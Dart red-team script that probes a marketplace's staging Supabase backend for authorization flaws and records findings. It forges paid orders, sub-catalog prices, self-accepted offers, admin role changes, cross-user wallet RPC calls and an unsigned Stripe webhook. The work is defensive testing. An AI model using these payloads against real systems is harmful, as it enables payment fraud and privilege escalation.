/// Blind independent red-team PASS 1 — coverage.
/// Staging fxdknzrqjenzqcvnwqqq only. No production. No Fase 4. No fixes.
import 'dart:convert';
import 'dart:io';

import 'package:http/http.dart' as http;

import '../live_ops_staging_client.dart';

const projectMust = 'fxdknzrqjenzqcvnwqqq';
const prefix = 'RT1719';

final matrix = <Map<String, dynamic>>[];
final findings = <Map<String, dynamic>>[];

void rec({
  required String surface,
  required String attack,
  required String identity,
  required String result,
  String impact = '',
  String severity = '',
  Object? evidence,
}) {
  matrix.add({
    'surface': surface,
    'attack': attack,
    'identity': identity,
    'result': result,
    'impact': impact,
    'severity': severity,
    'evidence': _clip(evidence),
  });
}

void finding({
  required String id,
  required String severity,
  required String title,
  required String actor,
  required String pre,
  required String repro,
  required String impact,
  String estado = 'ABERTO',
  Object? evidence,
}) {
  findings.add({
    'id': id,
    'severity': severity,
    'title': title,
    'actor': actor,
    'pre': pre,
    'repro': repro,
    'impact': impact,
    'estado': estado,
    'evidence': _clip(evidence),
  });
}

Object? _clip(Object? v) {
  if (v == null) return null;
  final s = v is String ? v : jsonEncode(v);
  if (s.length <= 1200) return v is String ? v : jsonDecode(jsonEncode(v));
  return '${s.substring(0, 1200)}…';
}

Map<String, String> hAnon(String urlAnon) => {
      'apikey': urlAnon,
      'Authorization': 'Bearer $urlAnon',
      'Content-Type': 'application/json',
      'Prefer': 'return=representation',
    };

Map<String, String> hJwt(String anon, String jwt) => {
      'apikey': anon,
      'Authorization': 'Bearer $jwt',
      'Content-Type': 'application/json',
      'Prefer': 'return=representation',
    };

Future<http.Response> rest(
  String url,
  String method,
  String path, {
  required Map<String, String> headers,
  Object? body,
}) {
  final u = Uri.parse('$url/rest/v1/$path');
  final b = body == null ? null : jsonEncode(body);
  switch (method) {
    case 'GET':
      return http.get(u, headers: headers);
    case 'POST':
      return http.post(u, headers: headers, body: b);
    case 'PATCH':
      return http.patch(u, headers: headers, body: b);
    case 'DELETE':
      return http.delete(u, headers: headers, body: b);
    default:
      throw ArgumentError(method);
  }
}

Future<http.Response> rpcRaw(
  String url,
  String fn,
  Map<String, dynamic> params, {
  required Map<String, String> headers,
}) {
  return http.post(
    Uri.parse('$url/rest/v1/rpc/$fn'),
    headers: headers,
    body: jsonEncode(params),
  );
}

Future<http.Response> edge(
  String url,
  String fn,
  Object? body, {
  required String anon,
  String? jwt,
  Map<String, String>? extra,
}) {
  return http.post(
    Uri.parse('$url/functions/v1/$fn'),
    headers: {
      'apikey': anon,
      'Authorization': 'Bearer ${jwt ?? anon}',
      'Content-Type': 'application/json',
      ...?extra,
    },
    body: body == null ? null : jsonEncode(body),
  );
}

String brief(http.Response r) {
  var b = r.body;
  if (b.length > 400) b = '${b.substring(0, 400)}…';
  return '${r.statusCode} $b';
}

bool looksDenied(http.Response r) {
  if (r.statusCode == 401 || r.statusCode == 403 || r.statusCode == 425) {
    return true;
  }
  final b = r.body.toLowerCase();
  return r.statusCode >= 400 &&
      (b.contains('row-level security') ||
          b.contains('permission') ||
          b.contains('not allowed') ||
          b.contains('42501') ||
          b.contains('jwt') ||
          b.contains('privilege'));
}

Future<void> main() async {
  final env = loadLiveOpsStagingEnv();
  final url = normalizeSupabaseProjectUrl(envRequire(env, 'SUPABASE_URL'));
  if (!url.contains(projectMust)) {
    stderr.writeln('REFUSED: not staging $projectMust');
    exit(2);
  }
  final anon = envRequire(env, 'SUPABASE_ANON_KEY');
  final svc = envRequire(env, 'SUPABASE_SERVICE_ROLE_KEY');
  final buyerId = envRequire(env, 'LIVE_OPS_TEST_BUYER_ID');
  final sellerId = envRequire(env, 'LIVE_OPS_TEST_SELLER_ID');
  final admin = LiveOpsStagingClient(
    url: url,
    anonKey: anon,
    serviceRoleKey: svc,
  );

  final buyerJwt = await admin.signIn(
    email: envRequire(env, 'LIVE_OPS_TEST_BUYER_EMAIL'),
    password: envRequire(env, 'LIVE_OPS_TEST_BUYER_PASSWORD'),
  );
  final sellerJwt = await admin.signIn(
    email: envRequire(env, 'LIVE_OPS_TEST_SELLER_EMAIL'),
    password: envRequire(env, 'LIVE_OPS_TEST_SELLER_PASSWORD'),
  );
  final hA = hAnon(anon);
  final hB = hJwt(anon, buyerJwt);
  final hS = hJwt(anon, sellerJwt);

  final stamp = DateTime.now().toUtc().toIso8601String().replaceAll(':', '');
  final helperEmail = '$prefix-h-$stamp@fleaber.invalid';
  final helperPass = 'Rt1719-Help-9x!A';
  late final String helperId;
  late final String helperJwt;
  try {
    helperId = await admin.createAdminUser(
      email: helperEmail,
      password: helperPass,
    );
    helperJwt = await admin.signIn(email: helperEmail, password: helperPass);
  } catch (e) {
    stderr.writeln('helper create failed: $e');
    exit(3);
  }
  final hH = hJwt(anon, helperJwt);

  // Fixture product (service_role — prep only)
  Map<String, dynamic> prod;
  try {
    prod = await admin.insert('products', {
      'seller_id': sellerId,
      'title': '$prefix probe product',
      'price': 12.34,
      'quantity': 3,
      'state': 'Bom',
      'is_sold': false,
      'list_on_marketplace': true,
    });
  } catch (e) {
    stderr.writeln('product insert fallback: $e');
    final existing = await admin.select(
      'products',
      filter: 'seller_id=eq.$sellerId',
      limit: 1,
    );
    if (existing.isEmpty) {
      stderr.writeln('no seller product');
      exit(3);
    }
    prod = existing.first;
  }
  final productId = prod['id'].toString();

  // ---------- OpenAPI ----------
  final oa = await http.get(
    Uri.parse('$url/rest/v1/'),
    headers: {
      ...hA,
      'Accept': 'application/openapi+json',
    },
  );
  final tables = <String>[];
  final rpcs = <String>[];
  if (oa.statusCode >= 200 && oa.statusCode < 300 && oa.body.isNotEmpty) {
    final spec = jsonDecode(oa.body) as Map<String, dynamic>;
    final paths = spec['paths'] as Map<String, dynamic>? ?? {};
    for (final k in paths.keys) {
      if (k.startsWith('/rpc/')) {
        rpcs.add(k.substring(5));
      } else if (k.startsWith('/') && !k.substring(1).contains('/')) {
        tables.add(k.substring(1));
      }
    }
    rpcs.sort();
    tables.sort();
  }
  rec(
    surface: 'PostgREST',
    attack: 'OpenAPI inventory',
    identity: 'anon',
    result: oa.statusCode == 200
        ? 'tables=${tables.length} rpcs=${rpcs.length}'
        : brief(oa),
    evidence: {'tables': tables.length, 'rpcs': rpcs.length, 'rpc_sample': rpcs.take(40).toList()},
  );

  // ---------- RLS matrix ----------
  final sensitive = [
    'wallets',
    'wallet_transactions',
    'wallet_payout_ledger',
    'orders',
    'products',
    'lives',
    'chats',
    'chat_messages',
    'reviews',
    'order_disputes',
    'order_dispute_messages',
    'stripe_checkout_events',
    'live_tips',
    'live_reservation_requests',
    'product_offers',
    'profiles',
    'live_raffles',
    'raffle_winners',
    'live_items',
    'live_messages',
    'notifications',
    'ps_ingest_audit',
    'ps_devices',
    'seller_bundle_discounts',
    'fleaber_commissions',
  ];

  Future<void> rlsOp({
    required String table,
    required String op,
    required String ident,
    required Map<String, String> hdrs,
    required String path,
    Object? body,
  }) async {
    http.Response r;
    try {
      r = await rest(url, op, path, headers: hdrs, body: body);
    } catch (e) {
      rec(surface: table, attack: op, identity: ident, result: 'EXC $e');
      return;
    }
    final denied = looksDenied(r);
    final empty200 = r.statusCode == 200 &&
        (r.body == '[]' || r.body == '' || r.body == 'null');
    rec(
      surface: table,
      attack: op,
      identity: ident,
      result: denied
          ? 'DENIED ${r.statusCode}'
          : empty200
              ? 'EMPTY ${r.statusCode}'
              : brief(r),
      impact: (!denied && !empty200 && r.statusCode < 400) ? 'POSSIBLE_LEAK_OR_WRITE' : '',
    );
  }

  for (final t in sensitive) {
    await rlsOp(table: t, op: 'GET', ident: 'anon', hdrs: hA, path: '$t?select=*&limit=3');
    await rlsOp(table: t, op: 'GET', ident: 'buyer', hdrs: hB, path: '$t?select=*&limit=5');
  }

  // Cross-user: buyer reads seller wallet / other orders
  await rlsOp(
    table: 'wallets',
    op: 'GET',
    ident: 'buyer',
    hdrs: hB,
    path: 'wallets?id=eq.$sellerId&select=*',
  );
  await rlsOp(
    table: 'orders',
    op: 'GET',
    ident: 'helper',
    hdrs: hH,
    path: 'orders?buyer_id=eq.$buyerId&select=id,status,price_total,amount_paid_cents&limit=5',
  );
  await rlsOp(
    table: 'lives',
    op: 'GET',
    ident: 'buyer',
    hdrs: hB,
    path: 'lives?select=id,mux_stream_key,stream_key,mux_live_id,status&limit=3',
  );
  await rlsOp(
    table: 'lives',
    op: 'GET',
    ident: 'anon',
    hdrs: hA,
    path: 'lives?select=id,mux_stream_key,stream_key&limit=3',
  );

  // Wallet writes
  for (final ident in [
    ['anon', hA],
    ['buyer', hB],
    ['seller', hS],
  ]) {
    final name = ident[0] as String;
    final hdr = ident[1] as Map<String, String>;
    final target = name == 'buyer' ? buyerId : sellerId;
    await rlsOp(
      table: 'wallets',
      op: 'PATCH',
      ident: name,
      hdrs: hdr,
      path: 'wallets?id=eq.$target',
      body: {'balance': 99999.12},
    );
    await rlsOp(
      table: 'wallets',
      op: 'POST',
      ident: name,
      hdrs: hdr,
      path: 'wallets',
      body: {'id': helperId, 'balance': 50.00},
    );
  }

  // Observe wallet after buyer PATCH
  final wSeller = await admin.select('wallets', filter: 'id=eq.$sellerId', limit: 1);
  final wBuyer = await admin.select('wallets', filter: 'id=eq.$buyerId', limit: 1);
  rec(
    surface: 'wallets',
    attack: 'observe after JWT PATCH',
    identity: 'service_observe',
    result: 'seller=${wSeller.isEmpty ? "none" : wSeller.first['balance']} buyer=${wBuyer.isEmpty ? "none" : wBuyer.first['balance']}',
    evidence: {'seller': wSeller, 'buyer': wBuyer},
  );

  // ---------- ORDER INSERT / UPDATE ----------
  Future<Map<String, dynamic>?> observeOrder(String? id) async {
    if (id == null || id.isEmpty) return null;
    final rows = await admin.select('orders', filter: 'id=eq.$id', limit: 1);
    return rows.isEmpty ? null : rows.first;
  }

  // A1 buyer INSERT with hostile money
  final insHostile = await rest(
    url,
    'POST',
    'orders',
    headers: hB,
    body: {
      'product_id': productId,
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'price_total': 0.01,
      'quantity': 1,
      'status': 'pago',
      'payment_method': 'Pagamento na app',
      'shipping_method': 'Entrega em mão (€0.00)',
      'amount_paid_cents': 99999,
      'stripe_payment_intent_id': 'pi_hostile_1719',
      'stripe_checkout_session_id': 'cs_hostile_1719',
      'contract_unit_cents': 1,
      'contract_qty': 1,
    },
  );
  String? orderHostileId;
  if (insHostile.statusCode < 400) {
    final body = jsonDecode(insHostile.body);
    if (body is List && body.isNotEmpty) {
      orderHostileId = body.first['id']?.toString();
    } else if (body is Map) {
      orderHostileId = body['id']?.toString();
    }
  }
  final rowHostile = await observeOrder(orderHostileId);
  rec(
    surface: 'orders',
    attack: 'INSERT hostile money/status/stripe/contract',
    identity: 'buyer',
    result: brief(insHostile),
    impact: rowHostile == null
        ? 'no persist'
        : 'status=${rowHostile['status']} paid=${rowHostile['amount_paid_cents']} contract=${rowHostile['contract_unit_cents']} pi=${rowHostile['stripe_payment_intent_id']} price=${rowHostile['price_total']}',
    evidence: rowHostile,
  );
  if (rowHostile != null) {
    final sealed = NumberLike(rowHostile['contract_unit_cents']);
    final status = '${rowHostile['status']}'.toLowerCase();
    final paid = NumberLike(rowHostile['amount_paid_cents']);
    final pi = '${rowHostile['stripe_payment_intent_id'] ?? ''}';
    if (status == 'pago' || paid > 0 || pi.contains('hostile')) {
      finding(
        id: 'RT1719-01',
        severity: 'P0',
        title: 'Buyer INSERT fabricates paid/stripe state',
        actor: 'buyer JWT',
        pre: 'lab buyer + fixture product',
        repro: 'POST /orders status=pago amount_paid/stripe/contract hostis',
        impact: 'Possible unpaid sale / capture attribution',
        evidence: rowHostile,
      );
    }
    if (sealed > 0 && sealed < 100) {
      finding(
        id: 'RT1719-02',
        severity: 'P0',
        title: 'Buyer INSERT seals sub-catalog contract_unit_cents',
        actor: 'buyer JWT',
        pre: 'catalog 12.34€',
        repro: 'POST /orders contract_unit_cents=1',
        impact: 'Checkout may charge 0.01€',
        evidence: rowHostile,
      );
    }
  }

  // A2 buyer PATCH status=pago
  if (orderHostileId != null) {
    final patchPago = await rest(
      url,
      'PATCH',
      'orders?id=eq.$orderHostileId',
      headers: hB,
      body: {'status': 'pago'},
    );
    final afterPago = await observeOrder(orderHostileId);
    rec(
      surface: 'orders',
      attack: 'PATCH status=pago',
      identity: 'buyer',
      result: brief(patchPago),
      impact: 'final_status=${afterPago?['status']}',
      evidence: afterPago,
    );
    if ('${afterPago?['status']}'.toLowerCase() == 'pago') {
      finding(
        id: 'RT1719-03',
        severity: 'P1',
        title: 'Buyer PATCH order to pago without capture',
        actor: 'buyer JWT',
        pre: 'own order',
        repro: 'PATCH orders status=pago',
        impact: 'FSM skip to paid',
        evidence: afterPago,
      );
    }

    final patchMoney = await rest(
      url,
      'PATCH',
      'orders?id=eq.$orderHostileId',
      headers: hB,
      body: {
        'amount_paid_cents': 1,
        'price_total': 0.50,
        'quantity': 99,
        'contract_unit_cents': 1,
      },
    );
    final afterMoney = await observeOrder(orderHostileId);
    rec(
      surface: 'orders',
      attack: 'PATCH money/qty/contract',
      identity: 'buyer',
      result: brief(patchMoney),
      impact:
          'qty=${afterMoney?['quantity']} paid=${afterMoney?['amount_paid_cents']} contract=${afterMoney?['contract_unit_cents']} price=${afterMoney?['price_total']}',
      evidence: afterMoney,
    );

    final patchConcluido = await rest(
      url,
      'PATCH',
      'orders?id=eq.$orderHostileId',
      headers: hB,
      body: {'status': 'concluido'},
    );
    rec(
      surface: 'orders',
      attack: 'PATCH status=concluido from prepay',
      identity: 'buyer',
      result: brief(patchConcluido),
      evidence: await observeOrder(orderHostileId),
    );
  }

  // A3 seller INSERT ghost order for helper as buyer
  final ghost = await rest(
    url,
    'POST',
    'orders',
    headers: hS,
    body: {
      'product_id': productId,
      'buyer_id': helperId,
      'seller_id': sellerId,
      'price_total': 12.34,
      'quantity': 1,
      'status': 'pago',
      'payment_method': 'MB WAY',
      'shipping_method': 'Entrega em mão (€0.00)',
    },
  );
  String? ghostId;
  if (ghost.statusCode < 400) {
    final body = jsonDecode(ghost.body);
    if (body is List && body.isNotEmpty) ghostId = body.first['id']?.toString();
  }
  final ghostRow = await observeOrder(ghostId);
  rec(
    surface: 'orders',
    attack: 'SELLER INSERT order for other buyer + status pago (MB WAY)',
    identity: 'seller',
    result: brief(ghost),
    impact: ghostRow == null
        ? 'no persist'
        : 'buyer=${ghostRow['buyer_id']} status=${ghostRow['status']} pm=${ghostRow['payment_method']}',
    evidence: ghostRow,
  );

  // A4 seller marks own pending as pago for Stripe method
  final insStripe = await rest(
    url,
    'POST',
    'orders',
    headers: hB,
    body: {
      'product_id': productId,
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'quantity': 1,
      'status': 'reserva_pendente',
      'payment_method': 'Pagamento na app',
      'shipping_method': 'Entrega em mão (€0.00)',
    },
  );
  String? stripeOrderId;
  if (insStripe.statusCode < 400) {
    final body = jsonDecode(insStripe.body);
    if (body is List && body.isNotEmpty) {
      stripeOrderId = body.first['id']?.toString();
    }
  }
  rec(
    surface: 'orders',
    attack: 'buyer INSERT normal stripe-method order',
    identity: 'buyer',
    result: brief(insStripe),
    evidence: await observeOrder(stripeOrderId),
  );
  if (stripeOrderId != null) {
    final sellerPago = await rest(
      url,
      'PATCH',
      'orders?id=eq.$stripeOrderId',
      headers: hS,
      body: {'status': 'pago'},
    );
    final after = await observeOrder(stripeOrderId);
    rec(
      surface: 'orders',
      attack: 'SELLER PATCH status=pago on platform payment without capture',
      identity: 'seller',
      result: brief(sellerPago),
      impact: 'final=${after?['status']}',
      evidence: after,
    );
    if ('${after?['status']}'.toLowerCase() == 'pago') {
      finding(
        id: 'RT1719-04',
        severity: 'P0',
        title: 'Seller marks platform order pago without Stripe capture',
        actor: 'seller JWT',
        pre: 'order payment_method Pagamento na app, no PI',
        repro: 'PATCH orders status=pago',
        impact: 'Fake platform payment → stock/wallet path',
        evidence: after,
      );
    }
  }

  // A5 helper INSERT claiming buyer_id of lab buyer
  final xUser = await rest(
    url,
    'POST',
    'orders',
    headers: hH,
    body: {
      'product_id': productId,
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'quantity': 1,
      'status': 'reserva_pendente',
      'payment_method': 'Pagamento na app',
      'shipping_method': 'Entrega em mão (€0.00)',
    },
  );
  rec(
    surface: 'orders',
    attack: 'helper INSERT as lab buyer',
    identity: 'helper',
    result: brief(xUser),
  );

  // ---------- OFFERS ----------
  final offerIns = await rest(
    url,
    'POST',
    'product_offers',
    headers: hB,
    body: {
      'product_id': productId,
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'amount': 0.50,
      'list_price': 12.34,
      'offered_by': 'buyer',
      'status': 'accepted',
    },
  );
  String? offerId;
  Map<String, dynamic>? offerRow;
  if (offerIns.statusCode < 400) {
    final body = jsonDecode(offerIns.body);
    if (body is List && body.isNotEmpty) {
      offerId = body.first['id']?.toString();
      offerRow = Map<String, dynamic>.from(body.first as Map);
    }
  }
  rec(
    surface: 'product_offers',
    attack: 'INSERT amount=0.50 status=accepted',
    identity: 'buyer',
    result: brief(offerIns),
    impact: offerRow == null ? '' : 'status=${offerRow['status']} amount=${offerRow['amount']}',
    evidence: offerRow,
  );
  if (offerId != null) {
    final selfAcc = await rest(
      url,
      'PATCH',
      'product_offers?id=eq.$offerId',
      headers: hB,
      body: {'status': 'accepted', 'responded_at': DateTime.now().toUtc().toIso8601String()},
    );
    final offers = await admin.select('product_offers', filter: 'id=eq.$offerId', limit: 1);
    rec(
      surface: 'product_offers',
      attack: 'buyer self-accept',
      identity: 'buyer',
      result: brief(selfAcc),
      impact: offers.isEmpty ? '' : 'status=${offers.first['status']}',
      evidence: offers,
    );
    if (offers.isNotEmpty && '${offers.first['status']}' == 'accepted') {
      finding(
        id: 'RT1719-05',
        severity: 'P1',
        title: 'Buyer can accept own offer',
        actor: 'buyer JWT',
        pre: 'own pending offer',
        repro: 'PATCH product_offers status=accepted',
        impact: 'Self-deal contract below catalog',
        evidence: offers.first,
      );
    }
    final amt = await rest(
      url,
      'PATCH',
      'product_offers?id=eq.$offerId',
      headers: hB,
      body: {'amount': 0.01},
    );
    rec(
      surface: 'product_offers',
      attack: 'PATCH amount while pending',
      identity: 'buyer',
      result: brief(amt),
      evidence: await admin.select('product_offers', filter: 'id=eq.$offerId', limit: 1),
    );
  }

  // ---------- REVIEWS ----------
  final revNoOrder = await rest(
    url,
    'POST',
    'reviews',
    headers: hB,
    body: {
      'target_id': sellerId,
      'buyer_id': buyerId,
      'stars': 1,
      'comment': '$prefix forged review no order',
      'is_automatic': false,
      'target_type': 'seller',
      'author_role': 'comprador',
    },
  );
  rec(
    surface: 'reviews',
    attack: 'INSERT without order_id',
    identity: 'buyer',
    result: brief(revNoOrder),
  );
  final revAsSeller = await rest(
    url,
    'POST',
    'reviews',
    headers: hB,
    body: {
      'target_id': buyerId,
      'buyer_id': sellerId,
      'stars': 5,
      'comment': '$prefix buyer forges seller review',
      'is_automatic': false,
      'target_type': 'buyer',
      'author_role': 'vendedor',
      'order_id': stripeOrderId,
    },
  );
  rec(
    surface: 'reviews',
    attack: 'INSERT author_role=vendedor as buyer',
    identity: 'buyer',
    result: brief(revAsSeller),
  );

  // ---------- PROFILES / ADMIN ----------
  final promo = await rest(
    url,
    'PATCH',
    'profiles?id=eq.$buyerId',
    headers: hB,
    body: {'user_type': 'admin'},
  );
  final prof = await admin.select('profiles', filter: 'id=eq.$buyerId', limit: 1);
  rec(
    surface: 'profiles',
    attack: 'PATCH user_type=admin',
    identity: 'buyer',
    result: brief(promo),
    impact: 'final_user_type=${prof.isEmpty ? "?" : prof.first['user_type']}',
    evidence: prof,
  );
  if (prof.isNotEmpty &&
      '${prof.first['user_type']}'.toLowerCase().contains('admin')) {
    finding(
      id: 'RT1719-06',
      severity: 'P0',
      title: 'Buyer can set user_type=admin',
      actor: 'buyer JWT',
      pre: 'own profile',
      repro: 'PATCH profiles user_type=admin',
      impact: 'batata_is_admin() true → privileged RPCs',
      evidence: prof.first,
    );
  }

  // ---------- PRODUCTS price as buyer / qty ----------
  await rlsOp(
    table: 'products',
    op: 'PATCH',
    ident: 'buyer',
    hdrs: hB,
    path: 'products?id=eq.$productId',
    body: {'price': 0.01, 'quantity': 999},
  );
  final prodAfter = await admin.select('products', filter: 'id=eq.$productId', limit: 1);
  rec(
    surface: 'products',
    attack: 'observe after buyer PATCH price/qty',
    identity: 'service_observe',
    result: prodAfter.isEmpty
        ? 'none'
        : 'price=${prodAfter.first['price']} qty=${prodAfter.first['quantity']}',
    evidence: prodAfter,
  );

  // ---------- RPC shotgun (sensitive names) ----------
  final rpcTargets = <String, Map<String, dynamic>>{
    'batata_ensure_wallet': {'p_user_id': sellerId},
    'batata_wallet_payout_debit': {
      'p_user_id': sellerId,
      'p_amount_cents': 100,
      'p_idempotency_key': 'rt1719-debit-foreign',
    },
    'batata_wallet_payout_finish': {
      'p_user_id': sellerId,
      'p_idempotency_key': 'rt1719-debit-foreign',
      'p_stripe_transfer_id': 'tr_fake',
    },
    'batata_release_seller_wallet_for_order': {
      'p_order_id': stripeOrderId ?? productId,
    },
    'batata_refund_buyer_wallet_for_order': {
      'p_order_id': stripeOrderId ?? productId,
    },
    'batata_send_live_tip_from_wallet': {
      'p_live_id': '00000000-0000-0000-0000-000000000001',
      'p_seller_id': sellerId,
      'p_amount': 1.0,
    },
    'batata_create_raffle_prize_order': {},
    'batata_process_partial_refund_dispute': {
      'p_order_id': stripeOrderId ?? '00000000-0000-0000-0000-000000000001',
    },
    'batata_finalize_stripe_order_refund': {
      'p_order_id': stripeOrderId ?? '00000000-0000-0000-0000-000000000001',
      'p_refund_id': 're_fake',
      'p_refund_id': 're_x',
    },
    'run_sql_string': {'query': 'select 1'},
    'batata_is_admin': {},
    'batata_generate_auto_feedback': {},
    'batata_find_user_id_by_email': {
      'p_email': envRequire(env, 'LIVE_OPS_TEST_SELLER_EMAIL'),
    },
    'batata_claim_checkout_session_slot': {
      'p_order_id': stripeOrderId ?? '00000000-0000-0000-0000-000000000001',
      'p_claim_token': 'rt1719claimtokenxx',
    },
    'batata_settle_live_tip_from_stripe': {
      'p_tip_id': '00000000-0000-0000-0000-000000000001',
      'p_stripe_session_id': 'cs_test_x',
      'p_paid_amount_cents': 100,
    },
    'batata_ingest_ocr_reservation': {},
    'batata_ps_claim_pairing': {'p_code': '000000'},
    'batata_live_reconcile_stripe_order': {
      'p_order_id': stripeOrderId ?? '00000000-0000-0000-0000-000000000001',
    },
    'batata_debit_wallet_once': {
      'p_wallet_id': buyerId,
      'p_amount': -50,
      'p_key': 'x',
    },
  };
  // fix duplicate key in map above
  rpcTargets['batata_finalize_stripe_order_refund'] = {
    'p_order_id': stripeOrderId ?? '00000000-0000-0000-0000-000000000001',
    'p_refund_id': 're_fake',
    'p_payment_intent_id': 'pi_x',
    'p_session_id': 'cs_x',
    'p_amount_cents': 100,
  };

  for (final fn in rpcTargets.keys) {
    for (final ident in [
      ['anon', hA],
      ['buyer', hB],
      ['seller', hS],
    ]) {
      final name = ident[0] as String;
      final hdr = ident[1] as Map<String, String>;
      final r = await rpcRaw(url, fn, rpcTargets[fn]!, headers: hdr);
      rec(
        surface: 'rpc/$fn',
        attack: 'call with hostile/cross ids',
        identity: name,
        result: brief(r),
        impact: (!looksDenied(r) && r.statusCode < 400) ? 'EXECUTED' : '',
      );
    }
  }

  // Extra RPCs from OpenAPI that look privileged
  final interesting = rpcs.where((n) {
    final l = n.toLowerCase();
    return l.contains('wallet') ||
        l.contains('payout') ||
        l.contains('refund') ||
        l.contains('admin') ||
        l.contains('settle') ||
        l.contains('sql') ||
        l.contains('grant') ||
        l.contains('refund') ||
        l.contains('payout') ||
        l.contains('commission') ||
        l.contains('raffle') ||
        l.contains('dispute');
  }).toList();
  rec(
    surface: 'rpc',
    attack: 'interesting OpenAPI names',
    identity: 'discover',
    result: '${interesting.length} names',
    evidence: interesting,
  );

  // ---------- EDGE ----------
  final edges = <String, Object?>{
    'create-payment-intent': {
      'buyer_id': buyerId,
      'order_id': stripeOrderId,
      'amount': 50,
      'quantity': 99,
      'item_price': 0.01,
      'shipping_method': 'Entrega em mão (€0.00)',
      'prize_shipping': true,
      'product_id': productId,
      'seller_id': helperId,
    },
    'refund-order': {'order_id': stripeOrderId},
    'create-connect-account': {
      'user_id': sellerId,
      'amount': 100,
      'idempotency_key': 'rt1719-buyer-payout-seller',
    },
    'create-live-tip-checkout': {
      'seller_id': sellerId,
      'amount_eur': 1,
      'live_id': '00000000-0000-0000-0000-000000000001',
      'tip_id': '00000000-0000-0000-0000-000000000002',
    },
    'create-mux-live': {'title': '$prefix mux hijack'},
    'sec-fase2-e2e-oversell': {'probe': true},
    'delete-test-account': {'confirm': 'APAGAR TUDO'},
    'ingest-ocr-reservation': {
      'live_id': '00000000-0000-0000-0000-000000000001',
      'ocr_line_hash': 'abcdefgh',
      'detected_at': DateTime.now().toUtc().toIso8601String(),
    },
    'ps-pairing-claim': {'code': '000000', 'device_id': 'rt1719'},
    'livekit-mux-publish': {
      'step': 'token',
      'live_id': '00000000-0000-0000-0000-000000000001',
    },
    'send-sms-bulkgate': {'phone': '+351910000000', 'text': 'pwn'},
    'complete-mux-live': {'live_id': '00000000-0000-0000-0000-000000000001'},
    'resolve-mux-playback': {'live_id': '00000000-0000-0000-0000-000000000001'},
  };

  for (final fn in edges.keys) {
    for (final ident in [
      ['anon', null],
      ['buyer', buyerJwt],
      ['seller', sellerJwt],
    ]) {
      final name = ident[0] as String;
      final jwt = ident[1] as String?;
      final r = await edge(url, fn, edges[fn], anon: anon, jwt: jwt);
      rec(
        surface: 'edge/$fn',
        attack: 'hostile body',
        identity: name,
        result: brief(r),
        impact: (r.statusCode < 400 && !looksDenied(r)) ? 'HTTP_OK' : '',
      );
    }
  }

  final wh = await http.post(
    Uri.parse('$url/functions/v1/stripe-webhook'),
    headers: {
      'apikey': anon,
      'Authorization': 'Bearer $anon',
      'Content-Type': 'application/json',
    },
    body: jsonEncode({
      'type': 'checkout.session.completed',
      'data': {
        'object': {'id': 'cs_test_forged', 'payment_status': 'paid'},
      },
    }),
  );
  rec(
    surface: 'edge/stripe-webhook',
    attack: 'forged event no signature',
    identity: 'anon',
    result: brief(wh),
  );

  // Checkout quote: create session and inspect amount vs catalog
  if (stripeOrderId != null) {
    final pay = await edge(
      url,
      'create-payment-intent',
      {
        'buyer_id': buyerId,
        'order_id': stripeOrderId,
        'amount': 50,
        'quantity': 99,
        'item_price': 0.01,
        'shipping_method': 'Entrega em mão (€0.00)',
      },
      anon: anon,
      jwt: buyerJwt,
    );
    rec(
      surface: 'edge/create-payment-intent',
      attack: 'client amount=50c qty=99 vs catalog 12.34',
      identity: 'buyer',
      result: brief(pay),
      evidence: pay.body.length > 800 ? pay.body.substring(0, 800) : pay.body,
    );
  }

  // Bag mix: two orders one helper product if possible
  // Storage
  final buckets = await http.get(
    Uri.parse('$url/storage/v1/bucket'),
    headers: hB,
  );
  rec(
    surface: 'storage',
    attack: 'list buckets',
    identity: 'buyer',
    result: brief(buckets),
  );
  for (final b in ['chat', 'chat-private', 'order_disputes', 'avatars', 'products']) {
    final list = await http.post(
      Uri.parse('$url/storage/v1/object/list/$b'),
      headers: hB,
      body: jsonEncode({'prefix': '', 'limit': 5}),
    );
    rec(
      surface: 'storage/$b',
      attack: 'list objects',
      identity: 'buyer',
      result: brief(list),
    );
  }

  // Cleanup fixture product leftover orders via service (observe only leftover)
  final outDir = Directory('tool/redteam_blind_indep_20260830T1719/out');
  outDir.createSync(recursive: true);
  final payload = {
    'frozen_at_pass': 'PASS1_NOT_FINAL',
    'project': projectMust,
    'started': stamp,
    'helper_id': helperId,
    'product_id': productId,
    'order_hostile_id': orderHostileId,
    'order_stripe_id': stripeOrderId,
    'ghost_id': ghostId,
    'tables': tables,
    'rpcs': rpcs,
    'interesting_rpcs': interesting,
    'matrix': matrix,
    'findings': findings,
  };
  File('${outDir.path}/pass1.json').writeAsStringSync(
    const JsonEncoder.withIndent('  ').convert(payload),
  );
  stdout.writeln('PASS1 written. matrix=${matrix.length} findings=${findings.length}');
  for (final f in findings) {
    stdout.writeln('FINDING ${f['id']} ${f['severity']} ${f['title']}');
  }
}

int NumberLike(Object? v) {
  if (v is int) return v;
  if (v is num) return v.round();
  return int.tryParse('$v') ?? 0;
}
